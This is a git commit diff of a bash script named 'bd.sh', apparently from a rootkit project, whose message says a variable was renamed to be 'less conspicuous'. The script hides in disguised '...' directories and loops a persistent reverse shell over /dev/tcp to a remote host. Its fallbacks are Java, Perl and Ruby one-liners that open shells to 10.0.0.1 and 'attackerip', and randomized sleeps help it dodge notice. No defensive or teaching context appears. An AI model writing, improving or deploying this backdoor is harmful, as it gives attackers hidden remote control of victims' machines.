864de6b2a08393a4f264b26aec6c4c92a0134a9a
wilsonfisk <wilson.fisk.secure@gmail.com>
2017-10-02 12:33:37 -0400

    Changed 'ROOTKIT_PATH' to something less conspicuous. Also changed a logical conditional statement into an If-then-else statement.

--- bd.sh
+++ bd.sh
@@ -1,18 +1,20 @@
 #!/bin/bash
-declare ROOTKIT_PATH
+. kukolny.cfg
+declare KUKOLNY_PATH
 function set_rootkit_path() {
     if [ $UID -eq 0 ] || [ $EUID -eq 0 ]
-        then ROOTKIT_PATH="/usr/include/..."
-        else ROOTKIT_PATH="/home/$USER/..."
+        then KUKOLNY_PATH="/usr/include/..."
+        else KUKOLNY_PATH="/home/$USER/..."
     fi
 }
 
 function connect_backdoor() {
-    local target_ip=$remote_host ; local target_port=$remote_port ; local sleep_time=$sleep_time
+    local target_ip=$remote_host;local target_port=$remote_port;local sleep_time=$sleep_time
     while true; do
         MAX_ROW_NUM=$(stty size|cut -d " " -f 1) ; MAX_COL_NUM=$(stty size|cut -d " " -f 2); 
-        { PS1='[\A j\j \u@\h:t\l \w]\$'; export PS1
-        exec 9<>/dev/tcp/"$target_ip"/"$target_port" ; [ $? -ne 0 ] && exit 0 || exec 0<&9; exec 1>&9 2>&1
+        { PS1='[\A j\j \u@\h:t\l \w]\$';export PS1
+        exec 9<>/dev/tcp/"$target_ip"/"$target_port" 
+		if [ $? -ne 0 ];then exit 0;else exec 0<&9;fi; exec 1>&9 2>&1
         if [ ! -x "$(type java>/dev/null)" ]
             then export MAX_ROW_NUM MAX_COL_NUM; java -cp 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();'
         elif [ ! -x "$(type perl>/dev/null)" ]
@@ -27,6 +29,6 @@ function connect_backdoor() {
             then export MAX_ROW_NUM MAX_COL_NUM; ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
             # ruby that does not depend on /bin/sh:
             # ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-        else /bin/bash --rcfile "$ROOTKIT_PATH"/.bdrc --noprofile -i
+        else /bin/bash --rcfile "$KUKOLNY_PATH"/.bdrc --noprofile -i
         fi; }& wait; sleep $((RANDOM%sleep_time+sleep_time)); done
 }
